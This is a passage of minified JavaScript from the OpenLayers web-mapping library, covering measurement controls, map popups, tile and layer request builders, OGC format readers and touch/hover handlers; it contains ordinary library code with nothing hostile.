b},getFullRequestString:function(a,b){var c=null==b?this.url:b;"object"==typeof c&amp;&amp;(c=c[Math.floor(Math.random()*c.length)]);var d=c,e=OpenLayers.Util.extend({},this.params),e=OpenLayers.Util.extend(e,a), f=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),g;for(g in e)g.toUpperCase()in f&amp;&amp;delete e[g];e=OpenLayers.Util.getParameterString(e);e=e.replace(/,/g,"+");""!=e&amp;&amp;(f=c.charAt(c.length-1),d="&amp;"==f||"?"==f?d+e:-1==c.indexOf("?")?d+("?"+e):d+("&amp;"+e));return d},getImageFilePath:function(a,b){var c=null==b?this.url:b;"object"==typeof c&amp;&amp;(c=c[Math.floor(Math.random()*c.length)]);var d="",e="";0>a.tilerow&amp;&amp;(d="-");d=0==a.tilerow?d+"0":d+Math.floor(Math.abs(a.tilerow/this.params.tileRowsPerFolder))* this.params.tileRowsPerFolder;0>a.tilecol&amp;&amp;(e="-");e=0==a.tilecol?e+"0":e+Math.floor(Math.abs(a.tilecol/this.params.tileColumnsPerFolder))*this.params.tileColumnsPerFolder;d="/S"+Math.floor(a.scaleindex)+"/"+this.params.basemaplayergroupname+"/R"+d+"/C"+e+"/"+a.tilerow%this.params.tileRowsPerFolder+"_"+a.tilecol%this.params.tileColumnsPerFolder+"."+this.params.format;this.params.querystring&amp;&amp;(d+="?"+this.params.querystring);return c+d},CLASS_NAME:"OpenLayers.Layer.MapGuide"});OpenLayers.Control.Measure=OpenLayers.Class(OpenLayers.Control,{callbacks:null,displaySystem:"metric",geodesic:!1,displaySystemUnits:{geographic:["dd"],english:["mi","ft","in"],metric:["km","m"]},partialDelay:300,delayedTrigger:null,persist:!1,immediate:!1,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);var c={done:this.measureComplete,point:this.measurePartial};this.immediate&amp;&amp;(c.modify=this.measureImmediate);this.callbacks=OpenLayers.Util.extend(c,this.callbacks); this.handlerOptions=OpenLayers.Util.extend({persist:this.persist},this.handlerOptions);this.handler=new a(this,this.callbacks,this.handlerOptions)},deactivate:function(){this.cancelDelay();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},cancel:function(){this.cancelDelay();this.handler.cancel()},setImmediate:function(a){(this.immediate=a)?this.callbacks.modify=this.measureImmediate:delete this.callbacks.modify},updateHandler:function(a,b){var c=this.active;c&amp;&amp;this.deactivate(); this.handler=new a(this,this.callbacks,b);c&amp;&amp;this.activate()},measureComplete:function(a){this.cancelDelay();this.measure(a,"measure")},measurePartial:function(a,b){this.cancelDelay();b=b.clone();this.handler.freehandMode(this.handler.evt)?this.measure(b,"measurepartial"):this.delayedTrigger=window.setTimeout(OpenLayers.Function.bind(function(){this.delayedTrigger=null;this.measure(b,"measurepartial")},this),this.partialDelay)},measureImmediate:function(a,b,c){c&amp;&amp;!this.handler.freehandMode(this.handler.evt)&amp;&amp; (this.cancelDelay(),this.measure(b.geometry,"measurepartial"))},cancelDelay:function(){null!==this.delayedTrigger&amp;&amp;(window.clearTimeout(this.delayedTrigger),this.delayedTrigger=null)},measure:function(a,b){var c,d;-1&lt;a.CLASS_NAME.indexOf("LineString")?(c=this.getBestLength(a),d=1):(c=this.getBestArea(a),d=2);this.events.triggerEvent(b,{measure:c[0],units:c[1],order:d,geometry:a})},getBestArea:function(a){for(var b=this.displaySystemUnits[this.displaySystem],c,d,e=0,f=b.length;e&lt;f&amp;&amp;!(c=b[e],d=this.getArea(a, c),1&lt;d);++e);return[d,c]},getArea:function(a,b){var c,d;this.geodesic?(c=a.getGeodesicArea(this.map.getProjectionObject()),d="m"):(c=a.getArea(),d=this.map.getUnits());var e=OpenLayers.INCHES_PER_UNIT[b];e&amp;&amp;(c*=Math.pow(OpenLayers.INCHES_PER_UNIT[d]/e,2));return c},getBestLength:function(a){for(var b=this.displaySystemUnits[this.displaySystem],c,d,e=0,f=b.length;e&lt;f&amp;&amp;!(c=b[e],d=this.getLength(a,c),1&lt;d);++e);return[d,c]},getLength:function(a,b){var c,d;this.geodesic?(c=a.getGeodesicLength(this.map.getProjectionObject()), d="m"):(c=a.getLength(),d=this.map.getUnits());var e=OpenLayers.INCHES_PER_UNIT[b];e&amp;&amp;(c*=OpenLayers.INCHES_PER_UNIT[d]/e);return c},CLASS_NAME:"OpenLayers.Control.Measure"});OpenLayers.Format.WMC.v1_0_0=OpenLayers.Class(OpenLayers.Format.WMC.v1,{VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/context http://schemas.opengis.net/context/1.0.0/context.xsd",initialize:function(a){OpenLayers.Format.WMC.v1.prototype.initialize.apply(this,[a])},read_wmc_SRS:function(a,b){var c=this.getChildValue(b);"object"!=typeof a.projections&amp;&amp;(a.projections={});for(var c=c.split(/ +/),d=0,e=c.length;d&lt;e;d++)a.projections[c[d]]=!0},write_wmc_Layer:function(a){var b=OpenLayers.Format.WMC.v1.prototype.write_wmc_Layer.apply(this, [a]);if(a.srs){var c=[],d;for(d in a.srs)c.push(d);b.appendChild(this.createElementDefaultNS("SRS",c.join(" ")))}b.appendChild(this.write_wmc_FormatList(a));b.appendChild(this.write_wmc_StyleList(a));a.dimensions&amp;&amp;b.appendChild(this.write_wmc_DimensionList(a));b.appendChild(this.write_wmc_LayerExtension(a))},CLASS_NAME:"OpenLayers.Format.WMC.v1_0_0"});OpenLayers.Popup.Anchored=OpenLayers.Class(OpenLayers.Popup,{relativePosition:null,keepInMap:!0,anchor:null,initialize:function(a,b,c,d,e,f,g){OpenLayers.Popup.prototype.initialize.apply(this,[a,b,c,d,f,g]);this.anchor=null!=e?e:{size:new OpenLayers.Size(0,0),offset:new OpenLayers.Pixel(0,0)}},destroy:function(){this.relativePosition=this.anchor=null;OpenLayers.Popup.prototype.destroy.apply(this,arguments)},show:function(){this.updatePosition();OpenLayers.Popup.prototype.show.apply(this,arguments)}, moveTo:function(a){var b=this.relativePosition;this.relativePosition=this.calculateRelativePosition(a);OpenLayers.Popup.prototype.moveTo.call(this,this.calculateNewPx(a));this.relativePosition!=b&amp;&amp;this.updateRelativePosition()},setSize:function(a){OpenLayers.Popup.prototype.setSize.apply(this,arguments);if(this.lonlat&amp;&amp;this.map){var b=this.map.getLayerPxFromLonLat(this.lonlat);this.moveTo(b)}},calculateRelativePosition:function(a){a=this.map.getLonLatFromLayerPx(a);a=this.map.getExtent().determineQuadrant(a); return OpenLayers.Bounds.oppositeQuadrant(a)},updateRelativePosition:function(){},calculateNewPx:function(a){a=a.offset(this.anchor.offset);var b=this.size||this.contentSize,c="t"==this.relativePosition.charAt(0);a.y+=c?-b.h:this.anchor.size.h;c="l"==this.relativePosition.charAt(1);a.x+=c?-b.w:this.anchor.size.w;return a},CLASS_NAME:"OpenLayers.Popup.Anchored"});OpenLayers.Popup.Framed=OpenLayers.Class(OpenLayers.Popup.Anchored,{imageSrc:null,imageSize:null,isAlphaImage:!1,positionBlocks:null,blocks:null,fixedRelativePosition:!1,initialize:function(a,b,c,d,e,f,g){OpenLayers.Popup.Anchored.prototype.initialize.apply(this,arguments);this.fixedRelativePosition&amp;&amp;(this.updateRelativePosition(),this.calculateRelativePosition=function(a){return this.relativePosition});this.contentDiv.style.position="absolute";this.contentDiv.style.zIndex=1;f&amp;&amp;(this.closeDiv.style.zIndex= 1);this.groupDiv.style.position="absolute";this.groupDiv.style.top="0px";this.groupDiv.style.left="0px";this.groupDiv.style.height="100%";this.groupDiv.style.width="100%"},destroy:function(){this.isAlphaImage=this.imageSize=this.imageSrc=null;this.fixedRelativePosition=!1;this.positionBlocks=null;for(var a=0;a&lt;this.blocks.length;a++){var b=this.blocks[a];b.image&amp;&amp;b.div.removeChild(b.image);b.image=null;b.div&amp;&amp;this.groupDiv.removeChild(b.div);b.div=null}this.blocks=null;OpenLayers.Popup.Anchored.prototype.destroy.apply(this, arguments)},setBackgroundColor:function(a){},setBorder:function(){},setOpacity:function(a){},setSize:function(a){OpenLayers.Popup.Anchored.prototype.setSize.apply(this,arguments);this.updateBlocks()},updateRelativePosition:function(){this.padding=this.positionBlocks[this.relativePosition].padding;if(this.closeDiv){var a=this.getContentDivPadding();this.closeDiv.style.right=a.right+this.padding.right+"px";this.closeDiv.style.top=a.top+this.padding.top+"px"}this.updateBlocks()},calculateNewPx:function(a){var b= OpenLayers.Popup.Anchored.prototype.calculateNewPx.apply(this,arguments);return b=b.offset(this.positionBlocks[this.relativePosition].offset)},createBlocks:function(){this.blocks=[];var a=null,b;for(b in this.positionBlocks){a=b;break}a=this.positionBlocks[a];for(b=0;b&lt;a.blocks.length;b++){var c={};this.blocks.push(c);c.div=OpenLayers.Util.createDiv(this.id+"_FrameDecorationDiv_"+b,null,null,null,"absolute",null,"hidden",null);c.image=(this.isAlphaImage?OpenLayers.Util.createAlphaImageDiv:OpenLayers.Util.createImage)(this.id+ "_FrameDecorationImg_"+b,null,this.imageSize,this.imageSrc,"absolute",null,null,null);c.div.appendChild(c.image);this.groupDiv.appendChild(c.div)}},updateBlocks:function(){this.blocks||this.createBlocks();if(this.size&amp;&amp;this.relativePosition){for(var a=this.positionBlocks[this.relativePosition],b=0;b&lt;a.blocks.length;b++){var c=a.blocks[b],d=this.blocks[b],e=c.anchor.left,f=c.anchor.bottom,g=c.anchor.right,h=c.anchor.top,k=isNaN(c.size.w)?this.size.w-(g+e):c.size.w,l=isNaN(c.size.h)?this.size.h-(f+ h):c.size.h;d.div.style.width=(0>k?0:k)+"px";d.div.style.height=(0>l?0:l)+"px";d.div.style.left=null!=e?e+"px":"";d.div.style.bottom=null!=f?f+"px":"";d.div.style.right=null!=g?g+"px":"";d.div.style.top=null!=h?h+"px":"";d.image.style.left=c.position.x+"px";d.image.style.top=c.position.y+"px"}this.contentDiv.style.left=this.padding.left+"px";this.contentDiv.style.top=this.padding.top+"px"}},CLASS_NAME:"OpenLayers.Popup.Framed"});OpenLayers.Popup.FramedCloud=OpenLayers.Class(OpenLayers.Popup.Framed,{contentDisplayClass:"olFramedCloudPopupContent",autoSize:!0,panMapIfOutOfView:!0,imageSize:new OpenLayers.Size(1276,736),isAlphaImage:!1,fixedRelativePosition:!1,positionBlocks:{tl:{offset:new OpenLayers.Pixel(44,0),padding:new OpenLayers.Bounds(8,40,8,9),blocks:[{size:new OpenLayers.Size("auto","auto"),anchor:new OpenLayers.Bounds(0,51,22,0),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null, 50,0,0),position:new OpenLayers.Pixel(-1238,0)},{size:new OpenLayers.Size("auto",19),anchor:new OpenLayers.Bounds(0,32,22,null),position:new OpenLayers.Pixel(0,-631)},{size:new OpenLayers.Size(22,18),anchor:new OpenLayers.Bounds(null,32,0,null),position:new OpenLayers.Pixel(-1238,-632)},{size:new OpenLayers.Size(81,35),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(0,-688)}]},tr:{offset:new OpenLayers.Pixel(-45,0),padding:new OpenLayers.Bounds(8,40,8,9),blocks:[{size:new OpenLayers.Size("auto", "auto"),anchor:new OpenLayers.Bounds(0,51,22,0),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null,50,0,0),position:new OpenLayers.Pixel(-1238,0)},{size:new OpenLayers.Size("auto",19),anchor:new OpenLayers.Bounds(0,32,22,null),position:new OpenLayers.Pixel(0,-631)},{size:new OpenLayers.Size(22,19),anchor:new OpenLayers.Bounds(null,32,0,null),position:new OpenLayers.Pixel(-1238,-631)},{size:new OpenLayers.Size(81,35),anchor:new OpenLayers.Bounds(0, 0,null,null),position:new OpenLayers.Pixel(-215,-687)}]},bl:{offset:new OpenLayers.Pixel(45,0),padding:new OpenLayers.Bounds(8,9,8,40),blocks:[{size:new OpenLayers.Size("auto","auto"),anchor:new OpenLayers.Bounds(0,21,22,32),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null,21,0,32),position:new OpenLayers.Pixel(-1238,0)},{size:new OpenLayers.Size("auto",21),anchor:new OpenLayers.Bounds(0,0,22,null),position:new OpenLayers.Pixel(0,-629)},{size:new OpenLayers.Size(22, 21),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(-1238,-629)},{size:new OpenLayers.Size(81,33),anchor:new OpenLayers.Bounds(null,null,0,0),position:new OpenLayers.Pixel(-101,-674)}]},br:{offset:new OpenLayers.Pixel(-44,0),padding:new OpenLayers.Bounds(8,9,8,40),blocks:[{size:new OpenLayers.Size("auto","auto"),anchor:new OpenLayers.Bounds(0,21,22,32),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,"auto"),anchor:new OpenLayers.Bounds(null,21,0,32),position:new OpenLayers.Pixel(-1238, 0)},{size:new OpenLayers.Size("auto",21),anchor:new OpenLayers.Bounds(0,0,22,null),position:new OpenLayers.Pixel(0,-629)},{size:new OpenLayers.Size(22,21),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(-1238,-629)},{size:new OpenLayers.Size(81,33),anchor:new OpenLayers.Bounds(0,null,null,0),position:new OpenLayers.Pixel(-311,-674)}]}},minSize:new OpenLayers.Size(105,10),maxSize:new OpenLayers.Size(1200,660),initialize:function(a,b,c,d,e,f,g){this.imageSrc=OpenLayers.Util.getImageLocation("cloud-popup-relative.png"); OpenLayers.Popup.Framed.prototype.initialize.apply(this,arguments);this.contentDiv.className=this.contentDisplayClass},CLASS_NAME:"OpenLayers.Popup.FramedCloud"});OpenLayers.Tile.Image.IFrame={useIFrame:null,blankImageUrl:"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAQAIBRAA7",draw:function(){if(OpenLayers.Tile.Image.prototype.shouldDraw.call(this)){var a=this.layer.getURL(this.bounds),b=this.useIFrame;this.useIFrame=null!==this.maxGetUrlLength&amp;&amp;!this.layer.async&amp;&amp;a.length>this.maxGetUrlLength;a=b&amp;&amp;!this.useIFrame;b=!b&amp;&amp;this.useIFrame;if(a||b)this.imgDiv&amp;&amp;this.imgDiv.parentNode===this.frame&amp;&amp;this.frame.removeChild(this.imgDiv),this.imgDiv= null,a&amp;&amp;this.frame.removeChild(this.frame.firstChild)}return OpenLayers.Tile.Image.prototype.draw.apply(this,arguments)},getImage:function(){if(!0===this.useIFrame){if(!this.frame.childNodes.length){var a=document.createElement("div"),b=a.style;b.position="absolute";b.width="100%";b.height="100%";b.zIndex=1;b.backgroundImage="url("+this.blankImageUrl+")";this.frame.appendChild(a)}a=this.id+"_iFrame";9>parseFloat(navigator.appVersion.split("MSIE")[1])?(b=document.createElement('&lt;iframe name="'+a+'">'), b.style.backgroundColor="#FFFFFF",b.style.filter="chroma(color=#FFFFFF)"):(b=document.createElement("iframe"),b.style.backgroundColor="transparent",b.name=a);b.scrolling="no";b.marginWidth="0px";b.marginHeight="0px";b.frameBorder="0";b.style.position="absolute";b.style.width="100%";b.style.height="100%";1>this.layer.opacity&amp;&amp;OpenLayers.Util.modifyDOMElement(b,null,null,null,null,null,null,this.layer.opacity);this.frame.appendChild(b);return this.imgDiv=b}return OpenLayers.Tile.Image.prototype.getImage.apply(this, arguments)},createRequestForm:function(){var a=document.createElement("form");a.method="POST";var b=this.layer.params._OLSALT,b=(b?b+"_":"")+this.bounds.toBBOX();a.action=OpenLayers.Util.urlAppend(this.layer.url,b);a.target=this.id+"_iFrame";this.layer.getImageSize();var b=OpenLayers.Util.getParameters(this.url),c,d;for(d in b)c=document.createElement("input"),c.type="hidden",c.name=d,c.value=b[d],a.appendChild(c);return a},setImgSrc:function(a){if(!0===this.useIFrame)if(a){var b=this.createRequestForm(); this.frame.appendChild(b);b.submit();this.frame.removeChild(b)}else this.imgDiv.parentNode===this.frame&amp;&amp;(this.frame.removeChild(this.imgDiv),this.imgDiv=null);else OpenLayers.Tile.Image.prototype.setImgSrc.apply(this,arguments)},onImageLoad:function(){OpenLayers.Tile.Image.prototype.onImageLoad.apply(this,arguments);!0===this.useIFrame&amp;&amp;(this.imgDiv.style.opacity=1,this.frame.style.opacity=this.layer.opacity)},createBackBuffer:function(){var a;!1===this.useIFrame&amp;&amp;(a=OpenLayers.Tile.Image.prototype.createBackBuffer.call(this)); return a}};OpenLayers.Format.SOSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.0.0",CLASS_NAME:"OpenLayers.Format.SOSCapabilities"});OpenLayers.Format.SOSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.SOSCapabilities,{namespaces:{ows:"http://www.opengis.net/ows/1.1",sos:"http://www.opengis.net/sos/1.0",gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.options=a},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this, [a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{gml:OpenLayers.Util.applyDefaults({name:function(a,b){b.name=this.getChildValue(a)},TimePeriod:function(a,b){b.timePeriod={};this.readChildNodes(a,b.timePeriod)},beginPosition:function(a,b){b.beginPosition=this.getChildValue(a)},endPosition:function(a,b){b.endPosition=this.getChildValue(a)}},OpenLayers.Format.GML.v3.prototype.readers.gml),sos:{Capabilities:function(a,b){this.readChildNodes(a,b)},Contents:function(a, b){b.contents={};this.readChildNodes(a,b.contents)},ObservationOfferingList:function(a,b){b.offeringList={};this.readChildNodes(a,b.offeringList)},ObservationOffering:function(a,b){var c=this.getAttributeNS(a,this.namespaces.gml,"id");b[c]={procedures:[],observedProperties:[],featureOfInterestIds:[],responseFormats:[],resultModels:[],responseModes:[]};this.readChildNodes(a,b[c])},time:function(a,b){b.time={};this.readChildNodes(a,b.time)},procedure:function(a,b){b.procedures.push(this.getAttributeNS(a, this.namespaces.xlink,"href"))},observedProperty:function(a,b){b.observedProperties.push(this.getAttributeNS(a,this.namespaces.xlink,"href"))},featureOfInterest:function(a,b){b.featureOfInterestIds.push(this.getAttributeNS(a,this.namespaces.xlink,"href"))},responseFormat:function(a,b){b.responseFormats.push(this.getChildValue(a))},resultModel:function(a,b){b.resultModels.push(this.getChildValue(a))},responseMode:function(a,b){b.responseModes.push(this.getChildValue(a))}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows}, CLASS_NAME:"OpenLayers.Format.SOSCapabilities.v1_0_0"});OpenLayers.Handler.Pinch=OpenLayers.Class(OpenLayers.Handler,{started:!1,stopDown:!1,pinching:!1,last:null,start:null,touchstart:function(a){var b=!0;this.pinching=!1;if(OpenLayers.Event.isMultiTouch(a))this.started=!0,this.last=this.start={distance:this.getDistance(a.touches),delta:0,scale:1},this.callback("start",[a,this.start]),b=!this.stopDown;else{if(this.started)return!1;this.started=!1;this.last=this.start=null}OpenLayers.Event.preventDefault(a);return b},touchmove:function(a){if(this.started&amp;&amp; OpenLayers.Event.isMultiTouch(a)){this.pinching=!0;var b=this.getPinchData(a);this.callback("move",[a,b]);this.last=b;OpenLayers.Event.stop(a)}else if(this.started)return!1;return!0},touchend:function(a){return this.started&amp;&amp;!OpenLayers.Event.isMultiTouch(a)?(this.pinching=this.started=!1,this.callback("done",[a,this.start,this.last]),this.last=this.start=null,!1):!0},activate:function(){var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&amp;&amp;(this.pinching=!1,a=!0);return a},deactivate:function(){var a= !1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.pinching=this.started=!1,this.last=this.start=null,a=!0);return a},getDistance:function(a){var b=a[0];a=a[1];return Math.sqrt(Math.pow(b.olClientX-a.olClientX,2)+Math.pow(b.olClientY-a.olClientY,2))},getPinchData:function(a){a=this.getDistance(a.touches);return{distance:a,delta:this.last.distance-a,scale:a/this.start.distance}},CLASS_NAME:"OpenLayers.Handler.Pinch"});OpenLayers.Control.NavToolbar=OpenLayers.Class(OpenLayers.Control.Panel,{initialize:function(a){OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);this.addControls([new OpenLayers.Control.Navigation,new OpenLayers.Control.ZoomBox])},draw:function(){var a=OpenLayers.Control.Panel.prototype.draw.apply(this,arguments);null===this.defaultControl&amp;&amp;(this.defaultControl=this.controls[0]);return a},CLASS_NAME:"OpenLayers.Control.NavToolbar"});OpenLayers.Strategy.Refresh=OpenLayers.Class(OpenLayers.Strategy,{force:!1,interval:0,timer:null,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);a&amp;&amp;(!0===this.layer.visibility&amp;&amp;this.start(),this.layer.events.on({visibilitychanged:this.reset,scope:this}));return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;(this.stop(),this.layer.events.un({visibilitychanged:this.reset,scope:this}));return a},reset:function(){!0===this.layer.visibility? this.start():this.stop()},start:function(){this.interval&amp;&amp;("number"===typeof this.interval&amp;&amp;0&lt;this.interval)&amp;&amp;(this.timer=window.setInterval(OpenLayers.Function.bind(this.refresh,this),this.interval))},refresh:function(){this.layer&amp;&amp;(this.layer.refresh&amp;&amp;"function"==typeof this.layer.refresh)&amp;&amp;this.layer.refresh({force:this.force})},stop:function(){null!==this.timer&amp;&amp;(window.clearInterval(this.timer),this.timer=null)},CLASS_NAME:"OpenLayers.Strategy.Refresh"});OpenLayers.Layer.ArcGIS93Rest=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{format:"png"},isBaseLayer:!0,initialize:function(a,b,c,d){var e=[];c=OpenLayers.Util.upperCaseObject(c);e.push(a,b,c,d);OpenLayers.Layer.Grid.prototype.initialize.apply(this,e);OpenLayers.Util.applyDefaults(this.params,OpenLayers.Util.upperCaseObject(this.DEFAULT_PARAMS));this.params.TRANSPARENT&amp;&amp;"true"==this.params.TRANSPARENT.toString().toLowerCase()&amp;&amp;(null!=d&amp;&amp;d.isBaseLayer||(this.isBaseLayer=!1),"jpg"==this.params.FORMAT&amp;&amp; (this.params.FORMAT=OpenLayers.Util.alphaHack()?"gif":"png"))},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.ArcGIS93Rest(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);var b=this.projection.getCode().split(":"),b=b[b.length-1],c=this.getImageSize();a={BBOX:a.toBBOX(),SIZE:c.w+","+c.h,F:"image",BBOXSR:b,IMAGESR:b};if(this.layerDefs){var b=[],d;for(d in this.layerDefs)this.layerDefs.hasOwnProperty(d)&amp;&amp; this.layerDefs[d]&amp;&amp;(b.push(d),b.push(":"),b.push(this.layerDefs[d]),b.push(";"));0&lt;b.length&amp;&amp;(a.LAYERDEFS=b.join(""))}return this.getFullRequestString(a)},setLayerFilter:function(a,b){this.layerDefs||(this.layerDefs={});b?this.layerDefs[a]=b:delete this.layerDefs[a]},clearLayerFilter:function(a){a?delete this.layerDefs[a]:delete this.layerDefs},mergeNewParams:function(a){a=[OpenLayers.Util.upperCaseObject(a)];return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,a)},CLASS_NAME:"OpenLayers.Layer.ArcGIS93Rest"});OpenLayers.Handler.Hover=OpenLayers.Class(OpenLayers.Handler,{delay:500,pixelTolerance:null,stopMove:!1,px:null,timerId:null,mousemove:function(a){this.passesTolerance(a.xy)&amp;&amp;(this.clearTimer(),this.callback("move",[a]),this.px=a.xy,a=OpenLayers.Util.extend({},a),this.timerId=window.setTimeout(OpenLayers.Function.bind(this.delayedCall,this,a),this.delay));return!this.stopMove},mouseout:function(a){OpenLayers.Util.mouseLeft(a,this.map.viewPortDiv)&amp;&amp;(this.clearTimer(),this.callback("move",[a]));return!0}, passesTolerance:function(a){var b=!0;this.pixelTolerance&amp;&amp;this.px&amp;&amp;Math.sqrt(Math.pow(this.px.x-a.x,2)+Math.pow(this.px.y-a.y,2))&lt;this.pixelTolerance&amp;&amp;(b=!1);return b},clearTimer:function(){null!=this.timerId&amp;&amp;(window.clearTimeout(this.timerId),this.timerId=null)},delayedCall:function(a){this.callback("pause",[a])},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.clearTimer(),a=!0);return a},CLASS_NAME:"OpenLayers.Handler.Hover"});OpenLayers.Control.GetFeature=OpenLayers.Class(OpenLayers.Control,{protocol:null,multipleKey:null,toggleKey:null,modifiers:null,multiple:!1,click:!0,single:!0,clickout:!0,toggle:!1,clickTolerance:5,hover:!1,box:!1,maxFeatures:10,features:null,hoverFeature:null,handlers:null,hoverResponse:null,filterType:OpenLayers.Filter.Spatial.BBOX,initialize:function(a){a.handlerOptions=a.handlerOptions||{};OpenLayers.Control.prototype.initialize.apply(this,[a]);this.features={};this.handlers={};this.click&amp;&amp;(this.handlers.click= new OpenLayers.Handler.Click(this,{click:this.selectClick},this.handlerOptions.click||{}));this.box&amp;&amp;(this.handlers.box=new OpenLayers.Handler.Box(this,{done:this.selectBox},OpenLayers.Util.extend(this.handlerOptions.box,{boxDivClassName:"olHandlerBoxSelectFeature"})));this.hover&amp;&amp;(this.handlers.hover=new OpenLayers.Handler.Hover(this,{move:this.cancelHover,pause:this.selectHover},OpenLayers.Util.extend(this.handlerOptions.hover,{delay:250,pixelTolerance:2})))},activate:function(){if(!this.active)for(var a in this.handlers)this.handlers[a].activate(); return OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){if(this.active)for(var a in this.handlers)this.handlers[a].deactivate();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},selectClick:function(a){var b=this.pixelToBounds(a.xy);this.setModifiers(a);this.request(b,{single:this.single})},selectBox:function(a){var b;if(a instanceof OpenLayers.Bounds)b=this.map.getLonLatFromPixel({x:a.left,y:a.bottom}),a=this.map.getLonLatFromPixel({x:a.right, y:a.top}),b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat);else{if(this.click)return;b=this.pixelToBounds(a)}this.setModifiers(this.handlers.box.dragHandler.evt);this.request(b)},selectHover:function(a){a=this.pixelToBounds(a.xy);this.request(a,{single:!0,hover:!0})},cancelHover:function(){this.hoverResponse&amp;&amp;(this.protocol.abort(this.hoverResponse),this.hoverResponse=null,OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait"))},request:function(a,b){b=b||{};var c=new OpenLayers.Filter.Spatial({type:this.filterType, value:a});OpenLayers.Element.addClass(this.map.viewPortDiv,"olCursorWait");c=this.protocol.read({maxFeatures:!0==b.single?this.maxFeatures:void 0,filter:c,callback:function(c){c.success()&amp;&amp;(c.features.length?!0==b.single?this.selectBestFeature(c.features,a.getCenterLonLat(),b):this.select(c.features):b.hover?this.hoverSelect():(this.events.triggerEvent("clickout"),this.clickout&amp;&amp;this.unselectAll()));OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait")},scope:this});!0==b.hover&amp;&amp;(this.hoverResponse= c)},selectBestFeature:function(a,b,c){c=c||{};if(a.length){b=new OpenLayers.Geometry.Point(b.lon,b.lat);for(var d,e,f,g=Number.MAX_VALUE,h=0;h&lt;a.length&amp;&amp;!(d=a[h],d.geometry&amp;&amp;(f=b.distanceTo(d.geometry,{edge:!1}),f&lt;g&amp;&amp;(g=f,e=d,0==g)));++h);!0==c.hover?this.hoverSelect(e):this.select(e||a)}},setModifiers:function(a){this.modifiers={multiple:this.multiple||this.multipleKey&amp;&amp;a[this.multipleKey],toggle:this.toggle||this.toggleKey&amp;&amp;a[this.toggleKey]}},select:function(a){this.modifiers.multiple||this.modifiers.toggle|| this.unselectAll();OpenLayers.Util.isArray(a)||(a=[a]);var b=this.events.triggerEvent("beforefeaturesselected",{features:a});if(!1!==b){for(var c=[],d,e=0,f=a.length;e&lt;f;++e)d=a[e],this.features[d.fid||d.id]?this.modifiers.toggle&amp;&amp;this.unselect(this.features[d.fid||d.id]):(b=this.events.triggerEvent("beforefeatureselected",{feature:d}),!1!==b&amp;&amp;(this.features[d.fid||d.id]=d,c.push(d),this.events.triggerEvent("featureselected",{feature:d})));this.events.triggerEvent("featuresselected",{features:c})}}, hoverSelect:function(a){var b=a?a.fid||a.id:null,c=this.hoverFeature?this.hoverFeature.fid||this.hoverFeature.id:null;c&amp;&amp;c!=b&amp;&amp;(this.events.triggerEvent("outfeature",{feature:this.hoverFeature}),this.hoverFeature=null);b&amp;&amp;b!=c&amp;&amp;(this.events.triggerEvent("hoverfeature",{feature:a}),this.hoverFeature=a)},unselect:function(a){delete this.features[a.fid||a.id];this.events.triggerEvent("featureunselected",{feature:a})},unselectAll:function(){for(var a in this.features)this.unselect(this.features[a])}, setMap:function(a){for(var b in this.handlers)this.handlers[b].setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},pixelToBounds:function(a){var b=a.add(-this.clickTolerance/2,this.clickTolerance/2);a=a.add(this.clickTolerance/2,-this.clickTolerance/2);b=this.map.getLonLatFromPixel(b);a=this.map.getLonLatFromPixel(a);return new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat)},CLASS_NAME:"OpenLayers.Control.GetFeature"});OpenLayers.Format.QueryStringFilter=function(){function a(a){a=a.replace(/%/g,"\\%");a=a.replace(/\\\\\.(\*)?/g,function(a,b){return b?a:"\\\\_"});a=a.replace(/\\\\\.\*/g,"\\\\%");a=a.replace(/(\\)?\.(\*)?/g,function(a,b,c){return b||c?a:"_"});a=a.replace(/(\\)?\.\*/g,function(a,b){return 